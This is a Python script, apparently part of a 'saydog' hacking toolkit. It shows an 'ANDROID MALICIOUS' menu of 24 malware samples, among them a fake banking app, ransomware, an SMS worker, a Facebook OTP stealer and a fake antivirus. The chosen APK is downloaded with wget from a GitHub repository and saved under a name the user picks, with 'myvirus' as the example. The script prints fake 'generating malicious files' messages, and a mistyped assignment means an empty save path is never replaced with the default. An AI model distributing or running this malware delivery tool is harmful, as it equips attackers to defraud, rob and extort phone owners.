#################### import modules ####################
import os
import sys
import time
from sys import *
#################### font colors ####################
w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"
#################### menu ####################
def menu():
        try:
                print (w)
                print (w+"{"+B+W+" ANDROID MALICIOUS "+w+"}")
                print (w)
                print (w+"{"+p+"01"+w+"} Advance")
                print (w+"{"+p+"02"+w+"} Agents")
                print (w+"{"+p+"03"+w+"} Badnews")
                print (w+"{"+p+"04"+w+"} Bios")
                print (w+"{"+p+"05"+w+"} Blat sms")
                print (w+"{"+p+"06"+w+"} Brain test")
                print (w+"{"+p+"07"+w+"} Crd informations")
                print (w+"{"+p+"08"+w+"} Candy corn")
                print (w+"{"+p+"09"+w+"} Cats ransom")
                print (w+"{"+p+"10"+w+"} Chis cortos")
                print (w+"{"+p+"11"+w+"} Chis ticos")
                print (w+"{"+p+"12"+w+"} Claco")
                print (w+"{"+p+"13"+w+"} Dend droid")
                print (w+"{"+p+"14"+w+"} Drop dialer")
                print (w+"{"+p+"15"+w+"} Facebook otp")
                print (w+"{"+p+"16"+w+"} Fake banking")
                print (w+"{"+p+"17"+w+"} Fake cmcc")
                print (w+"{"+p+"18"+w+"} Fake op")
                print (w+"{"+p+"19"+w+"} Fake validation")
                print (w+"{"+p+"20"+w+"} Fake av")
                print (w+"{"+p+"21"+w+"} Images pets")
                print (w+"{"+p+"22"+w+"} Laugher")
                print (w+"{"+p+"23"+w+"} Oh my godness")
                print (w+"{"+p+"24"+w+"} Sms worker")
                print (w)
                print (w+"{"+p+"00"+w+"} Back to main menu")
                print (w)
                main()
        except KeyboardInterrupt:
                sys.exit(1)

#################### main ####################
def main():
        dog = str(input(r+"saydog"+w+":"+p+"/malicious/"+w+"> "))
        if dog == "back" or dog == "0" or dog == "00":
                sys.exit(1)
        elif dog == "1" or dog == "01":
                apkname = "AdvanceOBF.apk"
                pass
        elif dog == "2" or dog == "02":
                apkname = "Agent.apk"
                pass
        elif dog == "3" or dog == "03":
                apkname = "BAD_NEWS.apk"
                pass
        elif dog == "4" or dog == "04":
                apkname = "BiOs.apk"
                pass
        elif dog == "5" or dog == "05":
                apkname = "BlatSMS.apk"
                pass
        elif dog == "6" or dog == "06":
                apkname = "BrainTest.apk"
                pass
        elif dog == "7" or dog == "07":
                apkname = "CRD-Information.apk"
                pass
        elif dog == "8" or dog == "08":
                apkname = "CandyCORN.apk"
                pass
        elif dog == "9" or dog == "09":
                apkname = "Cats.apk"
                pass
        elif dog == "10":
                apkname = "ChisCORTOS.apk"
                pass
        elif dog == "11":
                apkname = "ChisTICOS.apk"
                pass
        elif dog == "12":
                apkname = "Claco.apk"
                pass
        elif dog == "13":
                apkname = "Dend-Droid.apk"
                pass
        elif dog == "14":
                apkname = "Drop-Dialer.apk"
                pass
        elif dog == "15":
                apkname = "Facebook-OTP.apk"
                pass
        elif dog == "16":
                apkname = "Fake-BANK.apk"
                pass
        elif dog == "17":
                apkname = "Fake-CMCC.apk"
                pass
        elif dog == "18":
                apkname = "Fake-OP.apk"
                pass
        elif dog == "19":
                apkname = "Fake-VALID.apk"
                pass
        elif dog == "20":
                apkname = "Fake-AV.apk"
                pass
        elif dog == "21":
                apkname = "Image-PETS.apk"
                pass
        elif dog == "22":
                apkname = "Laughter.apk"
                pass
        elif dog == "23":
                apkname = "OMYGOD.apk"
                pass
        elif dog == "24":
                apkname = "Sms-WORKER.apk"
                pass
        else:
                main()
        print (w)
        name = str(input(b+"[+]"+w+" set filename (ex: myvirus): "))
        if name == "" or name == " ":
                name = apkname
                pass
        else:
                name = name
                pass
        outp = str(input(b+"[+]"+w+" save file to (ex: /sdcard): "))
        if outp == "" or outp == " ":
                outp == "/sdcard"
                pass
        else:
                outp == outp
                pass
        print (b+"[+]"+w+" generating malicious files")
        time.sleep(3)
        print (b+"[+]"+w+" malicious has been generated")
        print (b+"[+]"+w+" downloading files from database")
        print (b+"[+]"+w+" this could take a while")
        time.sleep(2)
        os.system("wget -O /"+outp+"/"+name+".apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
        print (g+"[+]"+w+" download successfully")
        print (g+"[+]"+w+" file saved as:- "+g+outp+"/"+name+".apk")
        dog = str(input(b+"[+]"+w+" press (enter) for back to main menu "))
        if dog == "":
                sys.exit(0)
        else:
                sys.exit(0)

if "__main__" == __name__:
    if "--run" in sys.argv:
        menu()
    else:
            os.system("saydog")